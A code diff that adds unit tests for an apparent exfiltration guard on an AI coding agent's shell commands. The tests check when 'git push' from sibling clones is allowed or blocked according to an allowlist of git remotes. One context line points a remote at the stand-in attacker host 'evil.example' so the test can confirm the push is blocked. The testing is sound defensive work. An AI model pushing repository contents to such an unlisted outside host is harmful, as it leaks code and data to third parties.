@@ -656,6 +656,44 @@ class BashGitAndGhTests(GuardFixture):
                            "pushing another repository is denied")
         self.assertBlocked(self.bash("cd $DIR && git push origin HEAD"), "could not be determined")
 
+    # TODO(review): no test asserts a [lab-hosts]-only entry is not a pin, nor case-insensitive pinning; file now exceeds 1600 lines — split first.
+    def _commit_git_remotes(self, *entries):
+        """Commit an allowlist whose ``[git-remotes]`` section is ``entries``;
+        the guard reads the allowlist from HEAD."""
+        self._write(".claude/hooks/exfil-allowlist.txt",
+                    "[lab-hosts]\nlocalhost\n[git-remotes]\n" + "".join(e + "\n" for e in entries))
+        _git(self.root, "add", ".claude/hooks/exfil-allowlist.txt")
+        _git(self.root, "commit", "-q", "-m", "allowlist")
+
+    def _sibling_clone(self, owner_repo):
+        other = os.path.join(self.outside_dir, "sibling")
+        os.makedirs(other)
+        _git(other, "init", "-q", "-b", "main")
+        _git(other, "remote", "add", "origin", f"git@github.com:{owner_repo}.git")
+        return other
+
+    def test_git_push_from_clone_pinned_by_owner_allows(self):
+        self._commit_git_remotes("github.com/almostrealism/", "github.com/almostrealism/common")
+        other = self._sibling_clone("almostrealism/sibling")
+        self.assertAllowed(self.bash(f"cd {other} && git push origin HEAD"))
+
+    def test_git_push_from_clone_pinned_exactly_allows(self):
+        self._commit_git_remotes("github.com/almostrealism/common", "github.com/almostrealism/sibling")
+        other = self._sibling_clone("almostrealism/sibling")
+        self.assertAllowed(self.bash(f"cd {other} && git push origin HEAD"))
+
+    def test_git_push_from_clone_of_unpinned_owner_blocks(self):
+        self._commit_git_remotes("github.com/almostrealism/", "github.com/almostrealism/common")
+        other = self._sibling_clone("someone-else/dump")
+        self.assertBlocked(self.bash(f"cd {other} && git push origin HEAD"),
+                           "pushing another repository is denied", "not pinned in [git-remotes]")
+
+    def test_git_push_from_clone_with_only_bare_host_blocks(self):
+        self._commit_git_remotes("github.com")
+        other = self._sibling_clone("almostrealism/sibling")
+        self.assertBlocked(self.bash(f"cd {other} && git push origin HEAD"),
+                           "pushing another repository is denied")
+
     def test_git_push_to_non_allowlisted_host_blocks(self):
         _git(self.root, "remote", "set-url", "origin", "git@evil.example:almostrealism/common.git")
         self.assertBlocked(self.bash("git push origin HEAD"), "not an allowlisted git remote")
